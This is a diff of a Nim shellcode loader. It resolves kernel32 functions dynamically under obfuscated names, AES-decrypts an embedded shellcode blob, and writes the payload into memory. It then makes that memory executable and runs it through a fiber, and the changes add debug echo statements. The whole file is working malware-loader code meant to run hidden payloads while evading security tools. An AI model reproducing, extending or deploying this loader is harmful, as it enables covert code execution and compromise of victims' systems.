@@ -1,6 +1,6 @@
 import winim
 import nimcrypto
-import DInvoke
+import DLoader
 
 func toByteSeq*(str: string): seq[byte] {.inline.} =
   ## Converts a string to the corresponding byte sequence.
@@ -36,8 +36,6 @@ VirtPr.add("ro")
 VirtPr.add("te")
 VirtPr.add("ct")
 
-#const WriteProcessMemory_FuncName * = WPM
-
 type
     WriteProcessMemory_t* = proc(hProcess: HANDLE, lpBaseAddress: LPVOID, lpBuffer: LPCVOID, nSize: SIZE_T, lpNumberOfBytesWritten: ptr SIZE_T): BOOL {.stdcall.}
 
@@ -52,13 +50,12 @@ var WriteProcessMemory_p*: WriteProcessMemory_t
 var VirtualAlloc_p*: VirtualAlloc_t
 
 var VirtualProtect_p*: VirtualProtect_t
+var k32Addr: HANDLE = get_library_address() 
 
-WriteProcessMemory_p = cast[WriteProcessMemory_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), WPM, 0, FALSE)))
-VirtualAlloc_p = cast[VirtualAlloc_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtAl, 0, FALSE)))
-VirtualProtect_p = cast[VirtualProtect_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtPr, 0, FALSE)))
+WriteProcessMemory_p = cast[WriteProcessMemory_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), WPM)))
+VirtualAlloc_p = cast[VirtualAlloc_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), VirtAl)))
+VirtualProtect_p = cast[VirtualProtect_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), VirtPr)))
 
-
-#proc VirtualP*(lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: PDWORD): BOOL {.discardable, stdcall, dynlib: "kernel32", importc: "VirtualProtect".}
 proc CreateF*(dwStackSize: SIZE_T, lpStartAddress: LPFIBER_START_ROUTINE, lpParameter: LPVOID): LPVOID {.discardable, stdcall, dynlib: "kernel32", importc: "CreateFiber".}
 proc SwitchToF*(lpFiber: LPVOID): VOID {.discardable, stdcall, dynlib: "kernel32", importc: "SwitchToFiber".}
 proc ConvertTToF*(lpParameter: LPVOID): LPVOID {.discardable, stdcall, dynlib: "kernel32", importc: "ConvertThreadToFiber".}
@@ -72,7 +69,6 @@ proc execute(): void =
 
     var dctx: CTR[aes256]
 
-    #let shellcode = fromHex(encShellcode)
     var decShellcode = newSeq[byte](len(shellcode))
     let decodedIV = fromHex(iv)
 
@@ -83,10 +79,14 @@ proc execute(): void =
 
     var oldProtect: DWORD
     ConvertTToF(NULL)
+    echo "ConvertToFiber called!"
     let buffer = VirtualAlloc_p(NULL, cast[SIZE_T](decShellcode.len), MEM_COMMIT, PAGE_READ_WRITE)
+    echo "VirtualAlloc called!"
     var bytesWritten: SIZE_T
     let pHandle = GetCurrentProcess()
+    echo "GetCurrentProcess called!"
     discard WriteProcessMemory_p(pHandle, buffer, unsafeAddr decShellcode[0], cast[SIZE_T](decShellcode.len), addr bytesWritten)
+    echo "WriteProcessMemory called!"
     discard VirtualProtect_p(buffer, cast[SIZE_T](decShellcode.len), PAGE_EXECUTE, addr oldProtect)
     let xFiber = CreateF(0, cast[LPFIBER_START_ROUTINE](buffer), NULL)
     SwitchToF(xFiber)
